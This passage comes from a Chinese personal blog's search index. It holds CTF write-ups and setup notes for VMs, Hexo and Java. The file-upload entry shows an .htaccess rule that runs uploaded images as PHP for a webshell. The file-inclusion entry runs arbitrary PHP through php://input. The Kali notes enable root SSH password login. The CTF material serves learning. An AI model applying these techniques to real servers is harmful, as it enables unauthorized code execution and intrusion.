    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传类题目记录</title>
    <url>/2020/08/04/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
<p><img src="/2020/08/04/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200804123829115.png" class="lazy" data-srcset="/2020/08/04/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200804123829115.png" srcset="/images/loadingImage.gif" alt="image-20200804123829115"></p>
<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
<p><img src="/2020/08/04/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/1988809-20200401194611819-1412530212.png" class="lazy" data-srcset="/2020/08/04/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/1988809-20200401194611819-1412530212.png" srcset="/images/loadingImage.gif" alt="img"></p>
<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
<pre><code class="hljs plain">&lt;FilesMatch &quot;1&quot;&gt;
SetHandler application&#x2F;x-httpd-php
&lt;&#x2F;FilesMatch&gt;</code></pre>
<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu (20.04)虚拟机安装配置</title>
    <url>/2020/05/12/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>/etc/apt/sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源链接不同，需要自己去官网找。</p>
<p>参考：<a href="https://mirrors.ustc.edu.cn/help/ubuntu.html">https://mirrors.ustc.edu.cn/help/ubuntu.html</a></p>
<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>系统配置</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包破解</title>
    <url>/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含类题目记录</title>
    <url>/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
<p>简单的文件包含题。</p>
<p><img src="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818013712744.png" class="lazy" data-srcset="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818013712744.png" srcset="/images/loadingImage.gif" alt="image-20200818013712744"></p>
<p>在phpinfo中可以发现</p>
<p><img src="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818013827411.png" class="lazy" data-srcset="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818013827411.png" srcset="/images/loadingImage.gif" alt="image-20200818013827411"></p>
<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
<p><img src="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818014205521.png" class="lazy" data-srcset="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818014205521.png" srcset="/images/loadingImage.gif" alt="image-20200818014205521"></p>
<p>尝试发现确实可行</p>
<p>现在我们就可以任意执行php代码了</p>
<p>对当前文件夹进行目录遍历</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myScanDir</span><span class="hljs-params">($dir)</span></span>
<span class="hljs-function">    </span>&#123;
        $file_arr = scandir($dir);
        $new_arr = [];
        <span class="hljs-keyword">foreach</span>($file_arr <span class="hljs-keyword">as</span> $item)&#123;

            <span class="hljs-keyword">if</span>($item!=<span class="hljs-string">".."</span> &amp;&amp; $item !=<span class="hljs-string">"."</span>)&#123;

                $new_arr[] = $item;
            &#125;
        &#125;
        <span class="hljs-keyword">return</span> $new_arr;

    &#125;

    $dir = myScanDir(<span class="hljs-string">"./"</span>);

    var_dump($dir); 

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818014553708.png" class="lazy" data-srcset="/2020/08/18/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/image-20200818014553708.png" srcset="/images/loadingImage.gif" alt="image-20200818014553708"></p>
<p>输出文件内容即可得到flag</p>
<pre><code class="hljs php">show_source(<span class="hljs-string">"./dle345aae.php"</span>);</code></pre>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>kali(Debian)虚拟机的网络配置</title>
    <url>/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
<img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" srcset="/images/loadingImage.gif" style="zoom:67%;">
<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
<img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" srcset="/images/loadingImage.gif" style="zoom:67%;">
<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
<p><img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" srcset="/images/loadingImage.gif" alt></p>
<p>然后配置网卡eth0</p>
<pre><code class="hljs plain">vim &#x2F;etc&#x2F;network&#x2F;interfaces</code></pre>
<p>若要设置IP为静态的，则插入以下几行</p>
<pre><code class="hljs plain">auto eth0 #开机启动网卡
iface eth0 inet static
	address 192.168.xxx.xxx #上面查看的IP地址
	broadcast 192.168.xxx.xxx #上面查看的网关地址
	netmask 255.255.255.0</code></pre>
<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
<pre><code class="hljs plain">auto eth0
iface eth0 inet dhcp</code></pre>
<p><code>:wq</code>保存退出之后，重启网卡</p>
<pre><code class="hljs plain">service networking restart</code></pre>
<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
<p>一般来说，kali默认已经安装了SSH</p>
<p>首先查看SSH状态</p>
<pre><code class="hljs plain">ps -e|grep ssh</code></pre>
<p><img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" srcset="/images/loadingImage.gif" alt></p>
<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
<pre><code class="hljs plain">sudo service ssh start</code></pre>
<p>然后修改sshd_config</p>
<pre><code class="hljs plain">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</code></pre>
<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
<p>保存退出。</p>
<p>重启SSH服务</p>
<pre><code class="hljs plain">service ssh restart</code></pre>
<p>要使ssh开机启动，命令为：</p>
<pre><code class="hljs plain">update-re.d ssh enable</code></pre>
<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
<img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" srcset="/images/loadingImage.gif" style="zoom:80%;">
<p>确定保存后，在v2ray界面底部查看代理地址</p>
<p><img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" srcset="/images/loadingImage.gif" alt="image-20210320105508684"></p>
<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
<img src="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" class="lazy" data-srcset="/2020/04/23/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" srcset="/images/loadingImage.gif" style="zoom:67%;">
<p>最后设置浏览器代理为系统代理即可。</p>
<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>系统配置</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客搭建</title>
    <url>/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
<p><strong>npm to cnpm</strong></p>
<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
<p>安装完成即可，ssh配置可以跳过</p>
<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
<pre><code class="hljs plain">cnpm install -g hexo</code></pre>
<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
<pre><code class="hljs plain">hexo init</code></pre>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>系统配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-GUI编程</title>
    <url>/2020/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-GUI%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-异常及处理</title>
    <url>/2020/05/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
<p><img src="/2020/05/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" class="lazy" data-srcset="/2020/05/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" srcset="/images/loadingImage.gif" alt="image-20200516112004702"></p>
<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
<p>不处理异常，将异常抛出给调用者。</p>
<p><code>throw</code>  、<code>throws</code></p>
<p>（挖坑待填）</p>
